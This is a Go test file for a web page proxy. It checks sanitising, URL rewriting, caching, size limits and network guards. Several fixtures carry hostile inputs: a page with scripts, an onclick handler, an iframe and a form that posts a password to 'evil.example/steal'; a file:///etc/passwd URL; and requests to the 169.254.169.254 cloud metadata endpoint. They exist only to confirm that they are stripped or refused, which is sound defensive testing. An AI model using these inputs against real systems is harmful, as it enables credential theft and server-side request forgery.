package pageproxy

import (
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/monstercameron/ArticleFlux/internal/netguard"
)

// prox is a recognisable stand-in for the real capability minter.
func prox(abs string) string { return "/asset?u=" + url.QueryEscape(abs) }
func page(abs string) string { return "/p?u=" + url.QueryEscape(abs) }

func serve(t *testing.T, body string, opts ...func(http.ResponseWriter)) *httptest.Server {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		for _, o := range opts {
			o(w)
		}
		_, _ = w.Write([]byte(body))
	}))
	t.Cleanup(srv.Close)
	return srv
}

func fetcher(t *testing.T) *Fetcher {
	t.Helper()
	return New(Options{Dir: t.TempDir(), AllowPrivate: true})
}

// The property the whole tier rests on: after this runs, nothing in the
// document points at the origin any more. A single missed URL is a request the
// reader's blocked network makes and fails.
func TestNothingPointsAtTheOriginAfterwards(t *testing.T) {
	srv := serve(t, `<!doctype html><html><head>
<title>A Page</title>
<link rel="stylesheet" href="/style.css">
<style>.hero{background:url(/bg.png)}</style>
</head><body>
<img src="/hero.png" srcset="/hero.png 1x, /hero@2x.png 2x">
<p>Words</p>
<a href="/next">Next</a>
</body></html>`)

	p, err := fetcher(t).Get(context.Background(), srv.URL+"/article", prox, page)
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	// The origin's own host must not survive anywhere in the markup — not in a
	// src, not in a srcset candidate, not inside a CSS url().
	host := strings.TrimPrefix(srv.URL, "http://")
	if strings.Contains(p.HTML, host) {
		t.Errorf("the origin host survived in the output:\n%s", p.HTML)
	}
	for _, want := range []string{"/asset?u=", "/p?u="} {
		if !strings.Contains(p.HTML, want) {
			t.Errorf("missing %q in:\n%s", want, p.HTML)
		}
	}
	if p.Title != "A Page" {
		t.Errorf("title = %q", p.Title)
	}
}

// Scripts are the difference between a document and a program. Sanitize drops
// them; this is the test that says so at the seam rather than in a unit test of
// the policy.
func TestScriptsAndFormsAreGone(t *testing.T) {
	srv := serve(t, `<html><body>
<script>alert(1)</script>
<script src="/app.js"></script>
<form action="https://evil.example/steal"><input name="password"></form>
<div onclick="alert(2)">click</div>
<iframe src="https://evil.example/"></iframe>
<p>Real content</p>
</body></html>`)

	p, err := fetcher(t).Get(context.Background(), srv.URL+"/x", prox, page)
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	for _, gone := range []string{"<script", "alert(", "<form", "onclick", "<iframe", "evil.example"} {
		if strings.Contains(p.HTML, gone) {
			t.Errorf("%q survived sanitizing:\n%s", gone, p.HTML)
		}
	}
	if !strings.Contains(p.HTML, "Real content") {
		t.Errorf("the actual content was lost:\n%s", p.HTML)
	}
}

// Layout has to survive, or the feature delivers a wall of unstyled text and
// calls it a page. class/id/style are what every stylesheet selects on.
func TestLayoutAttributesSurvive(t *testing.T) {
	srv := serve(t, `<html><body>
<div class="wrapper" id="main" style="max-width:60em">
<article class="post"><h1>Headline</h1><p class="lede">Lede</p></article>
</div></body></html>`)

	p, err := fetcher(t).Get(context.Background(), srv.URL+"/x", prox, page)
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	for _, want := range []string{`class="wrapper"`, `id="main"`, "max-width:60em", `class="lede"`} {
		if !strings.Contains(p.HTML, want) {
			t.Errorf("missing %q — the page will render unstyled:\n%s", want, p.HTML)
		}
	}
}

// <base href> retargets every relative URL. Sanitize does not allow the tag, so
// rewriting has to happen first — this is the test that pins that ordering.
func TestBaseHrefIsHonouredDespiteSanitizeDroppingIt(t *testing.T) {
	srv := serve(t, `<html><head><base href="https://cdn.example/assets/"></head>
<body><img src="pic.png"></body></html>`)

	p, err := fetcher(t).Get(context.Background(), srv.URL+"/x", prox, page)
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	if !strings.Contains(p.HTML, url.QueryEscape("https://cdn.example/assets/pic.png")) {
		t.Fatalf("base href was not honoured — sanitize ran before rewrite:\n%s", p.HTML)
	}
	if strings.Contains(p.HTML, "<base") {
		t.Errorf("base survived into the output:\n%s", p.HTML)
	}
}

// Relative URLs resolve against where the fetch LANDED, not where it was aimed.
func TestRelativeURLsResolveAgainstTheFinalURL(t *testing.T) {
	dest := serve(t, `<html><body><img src="pic.png"></body></html>`)
	redirector := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, dest.URL+"/deep/page.html", http.StatusFound)
	}))
	defer redirector.Close()

	p, err := fetcher(t).Get(context.Background(), redirector.URL+"/start", prox, page)
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	if !strings.Contains(p.HTML, url.QueryEscape(dest.URL+"/deep/pic.png")) {
		t.Fatalf("resolved against the requested URL rather than the final one:\n%s\nfinal=%s",
			p.HTML, p.FinalURL)
	}
}

func TestNonHTMLIsRefused(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/pdf")
		_, _ = w.Write([]byte("%PDF-1.4"))
	}))
	defer srv.Close()

	_, err := fetcher(t).Get(context.Background(), srv.URL+"/doc.pdf", prox, page)
	if !errors.Is(err, ErrNotHTML) {
		t.Fatalf("err = %v, want ErrNotHTML", err)
	}
}

func TestUpstreamErrorIsReported(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		http.Error(w, "nope", http.StatusForbidden)
	}))
	defer srv.Close()

	_, err := fetcher(t).Get(context.Background(), srv.URL+"/x", prox, page)
	if !errors.Is(err, ErrUpstream) {
		t.Fatalf("err = %v, want ErrUpstream", err)
	}
}

func TestSizeCapIsEnforced(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		buf := make([]byte, 4096)
		for range 32 {
			_, _ = w.Write(buf)
		}
	}))
	defer srv.Close()

	f := New(Options{Dir: t.TempDir(), AllowPrivate: true, MaxBytes: 8 << 10})
	if _, err := f.Get(context.Background(), srv.URL+"/big", prox, page); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("err = %v, want ErrTooLarge", err)
	}
}

// The cache holds the RAW page, so a second view re-mints fresh capabilities
// rather than replaying expiring ones — while still not re-fetching.
func TestCacheReusesTheFetchButRemintsTheURLs(t *testing.T) {
	var hits atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		hits.Add(1)
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte(`<html><body><img src="/a.png"></body></html>`))
	}))
	defer srv.Close()

	f := fetcher(t)
	first, err := f.Get(context.Background(), srv.URL+"/x", prox, page)
	if err != nil {
		t.Fatalf("first: %v", err)
	}
	if !first.Fetched {
		t.Error("first call should report a network fetch")
	}

	n := 0
	stamped := func(abs string) string { n++; return "/asset?v=2&u=" + url.QueryEscape(abs) }
	second, err := f.Get(context.Background(), srv.URL+"/x", stamped, page)
	if err != nil {
		t.Fatalf("second: %v", err)
	}
	if hits.Load() != 1 {
		t.Errorf("origin hit %d times; the cache did not serve the second view", hits.Load())
	}
	if second.Fetched {
		t.Error("second call should report a cache hit")
	}
	if n == 0 || !strings.Contains(second.HTML, "v=2") {
		t.Errorf("cached page replayed stale capabilities instead of re-minting:\n%s", second.HTML)
	}
}

// A page is a moving target — cacheTTL is deliberately short so a reader who
// reopens the same article an hour later sees what the site looks like now,
// not what it looked like when they first clicked through. Backdating the
// cache file's mtime stands in for the 30 real minutes cacheTTL asks for; the
// property under test is readCache's expiry arithmetic.
func TestPageCacheExpiresAfterTTL(t *testing.T) {
	var hits atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		hits.Add(1)
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte(`<html><body>v1</body></html>`))
	}))
	defer srv.Close()

	f := fetcher(t)
	target := srv.URL + "/x"

	first, err := f.Get(context.Background(), target, prox, page)
	if err != nil {
		t.Fatalf("first: %v", err)
	}
	if !first.Fetched || hits.Load() != 1 {
		t.Fatalf("first call: fetched=%v hits=%d, want fetched=true hits=1", first.Fetched, hits.Load())
	}

	// Still within the TTL: a second read must be served from cache.
	second, err := f.Get(context.Background(), target, prox, page)
	if err != nil {
		t.Fatalf("second: %v", err)
	}
	if second.Fetched || hits.Load() != 1 {
		t.Fatalf("second call (within TTL): fetched=%v hits=%d, want fetched=false hits=1", second.Fetched, hits.Load())
	}

	old := time.Now().Add(-cacheTTL - time.Minute)
	if err := os.Chtimes(f.path(target), old, old); err != nil {
		t.Fatalf("Chtimes: %v", err)
	}

	third, err := f.Get(context.Background(), target, prox, page)
	if err != nil {
		t.Fatalf("third: %v", err)
	}
	if !third.Fetched || hits.Load() != 2 {
		t.Errorf("third call (after TTL): fetched=%v hits=%d, want fetched=true hits=2 — "+
			"an expired page cache entry must be refetched, not served stale forever",
			third.Fetched, hits.Load())
	}
}

// A non-http(s) scheme must never reach the fetch. net/http's own client
// already refuses these transports too, so this pins the outcome to
// netguard's own sentinel rather than to "some error happened" — the latter
// would still pass with CheckURL deleted, since the stdlib's "unsupported
// protocol scheme" is a different failure wearing the same shape.
func TestSchemeIsRefused(t *testing.T) {
	f := fetcher(t)
	for _, u := range []string{"file:///etc/passwd", "gopher://x/1", "ftp://x/y.html"} {
		if _, err := f.Get(context.Background(), u, prox, page); !errors.Is(err, netguard.ErrScheme) {
			t.Errorf("%s: err = %v, want netguard.ErrScheme", u, err)
		}
	}
}

// The case that actually isolates netguard's contribution: a blocked address
// on an allowed scheme. An `err == nil` check here cannot tell "the guard
// rejected it" from "169.254.169.254 was simply unreachable from this box",
// which is exactly the failure mode a deleted guard produces — so pin the
// specific sentinel.
func TestBlockedAddressIsRefused(t *testing.T) {
	f := New(Options{Dir: t.TempDir()}) // AllowPrivate off
	_, err := f.Get(context.Background(), "http://169.254.169.254/latest/meta-data/", prox, page)
	if !errors.Is(err, netguard.ErrBlockedIP) {
		t.Fatalf("err = %v, want netguard.ErrBlockedIP — the metadata endpoint "+
			"must be refused BY THE GUARD, not merely fail to connect", err)
	}
}

// A cache entry is read from disk before anything is validated. If the final
// URL recorded there has since become unparseable — corruption, or a future
// bug in writeCache — Get must error rather than pass a nil-ish url.URL into
// rewrite.HTML.
func TestGetFailsWhenCachedFinalURLIsUnparsable(t *testing.T) {
	f := fetcher(t)
	key := "http://example.com/cached-bad-url"
	p := f.path(key)
	if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
		t.Fatal(err)
	}
	// "%zz" is not a valid percent-escape, which is what makes url.Parse itself
	// fail rather than merely parsing into something surprising.
	if err := os.WriteFile(p, []byte("http://x/%zz\n<html></html>"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := f.Get(context.Background(), key, prox, page); err == nil {
		t.Error("an unparsable cached final URL should error, not panic")
	}
}

// Same guard as netguard's own tests, exercised through the AllowPrivate
// branch specifically (fetch's `if f.allowPrivate` arm) rather than the
// default-strict one every other test here uses.
func TestFetchRefusesNeverAllowedEvenWithPrivateAllowed(t *testing.T) {
	f := New(Options{Dir: t.TempDir(), AllowPrivate: true})
	_, err := f.Get(context.Background(), "http://169.254.169.254/latest/meta-data/", prox, page)
	if !errors.Is(err, netguard.ErrBlockedIP) {
		t.Fatalf("err = %v, want netguard.ErrBlockedIP even with AllowPrivate set", err)
	}
}

// Nothing listening on the port is a transport error distinct from a bad
// status code, and fetch has to surface it rather than dereference a nil
// response.
func TestFetchSurfacesTransportError(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
	dead := srv.URL
	srv.Close() // nothing is listening on this loopback port now

	if _, err := fetcher(t).Get(context.Background(), dead, prox, page); err == nil {
		t.Error("a connection to a closed port should fail, not succeed")
	}
}

// A body shorter than its declared Content-Length must surface as a read
// error rather than a silently truncated page.
func TestFetchSurfacesTruncatedBody(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		hj, ok := w.(http.Hijacker)
		if !ok {
			t.Fatal("httptest server must support hijacking")
		}
		conn, buf, err := hj.Hijack()
		if err != nil {
			t.Fatal(err)
		}
		defer conn.Close()
		_, _ = buf.WriteString("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 10000\r\n\r\nshort")
		_ = buf.Flush()
	}))
	defer srv.Close()

	if _, err := fetcher(t).Get(context.Background(), srv.URL, prox, page); err == nil {
		t.Error("a truncated body should be a read error")
	}
}

// title() is scanned rather than parsed, which means every boundary is a
// hand-written index check rather than something a real HTML parser would
// just handle. Each case here is one of those checks failing to find its
// landmark.
func TestTitleHandlesMalformedMarkup(t *testing.T) {
	cases := []struct {
		name, raw, want string
	}{
		{"no closing angle bracket on the opening tag", "<html><title", ""},
		{"opening tag but no </title> anywhere", "<title>Unclosed", ""},
		{"title longer than the 200-char cap", "<title>" + strings.Repeat("x", 250) + "</title>", strings.Repeat("x", 200)},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := title([]byte(c.raw)); got != c.want {
				t.Errorf("title(%.30q) = %q, want %q", c.raw, got, c.want)
			}
		})
	}
}

// A zero-value Fetcher (Dir never configured) must treat the cache as always
// empty rather than trying to stat/write into "" and touching the process's
// working directory.
func TestCacheIsANoopWhenDirIsUnset(t *testing.T) {
	f := &Fetcher{}
	if _, _, ok := f.readCache("http://x.example/"); ok {
		t.Error("readCache with no dir configured must always miss")
	}
	f.writeCache("http://x.example/", []byte("body"), "http://x.example/") // must not panic
}

// A cache entry that exists but cannot be read (here: the path is a
// directory, not a file — the shape a half-finished MkdirAll from a crashed
// process would leave behind) must be treated as a miss, not a crash.
func TestReadCacheMissesWhenEntryIsUnreadable(t *testing.T) {
	f := fetcher(t)
	key := "http://unreadable.example/"
	p := f.path(key)
	if err := os.MkdirAll(p, 0o700); err != nil {
		t.Fatal(err)
	}
	if _, _, ok := f.readCache(key); ok {
		t.Error("a cache entry that fails to read should miss, not succeed")
	}
}

// The on-disk format is "finalURL\nbody". A file missing the delimiter — any
// corruption that lost the first newline — must miss rather than hand back a
// zero-value final URL as if it were real.
func TestReadCacheMissesOnEntryMissingDelimiter(t *testing.T) {
	f := fetcher(t)
	key := "http://corrupt.example/"
	p := f.path(key)
	if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte("no newline delimiter anywhere in this file"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, _, ok := f.readCache(key); ok {
		t.Error("a cache entry without the finalURL delimiter should miss")
	}
}

// MkdirAll fails when a plain file already occupies the shard directory's
// path. writeCache must give up quietly rather than panic — a cache write is
// always a best-effort side channel, never something the caller waits on.
func TestWriteCacheGivesUpWhenShardDirIsBlocked(t *testing.T) {
	f := fetcher(t)
	key := "http://blocked.example/"
	p := f.path(key)
	if err := os.WriteFile(filepath.Dir(p), []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	f.writeCache(key, []byte("body"), "http://blocked.example/") // must not panic
	if _, err := os.Stat(p); err == nil {
		t.Error("no cache file should have been written when its directory was blocked")
	}
}

// The final os.Rename(tmp, p) can fail — here because p is already occupied
// by a directory, which a plain file can never be renamed onto. writeCache
// must clean up the temp file rather than leaking it.
func TestWriteCacheCleansUpTempFileWhenRenameFails(t *testing.T) {
	f := fetcher(t)
	key := "http://rename-fails.example/"
	p := f.path(key)
	if err := os.MkdirAll(p, 0o700); err != nil {
		t.Fatal(err)
	}
	f.writeCache(key, []byte("body"), "http://rename-fails.example/") // must not panic

	entries, err := os.ReadDir(filepath.Dir(p))
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if strings.HasPrefix(e.Name(), "tmp-") {
			t.Errorf("temp file %q was left behind after a failed rename", e.Name())
		}
	}
}

func TestNonUTF8PageIsDecodedOnce(t *testing.T) {
	// Windows-1252 é is a single 0xE9 byte. Decoded once it is "café";
	// decoded twice it is "cafÃ©", which is the bug the feed corpus found.
	body := append([]byte(`<html><head><meta charset="windows-1252"></head><body><p>caf`),
		0xE9, '<', '/', 'p', '>', '<', '/', 'b', 'o', 'd', 'y', '>', '<', '/', 'h', 't', 'm', 'l', '>')
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=windows-1252")
		_, _ = w.Write(body)
	}))
	defer srv.Close()

	p, err := fetcher(t).Get(context.Background(), srv.URL+"/x", prox, page)
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	if !strings.Contains(p.HTML, "café") {
		t.Errorf("expected café, got:\n%s", p.HTML)
	}
	if strings.Contains(p.HTML, "cafÃ©") {
		t.Errorf("double-decoded:\n%s", p.HTML)
	}
}
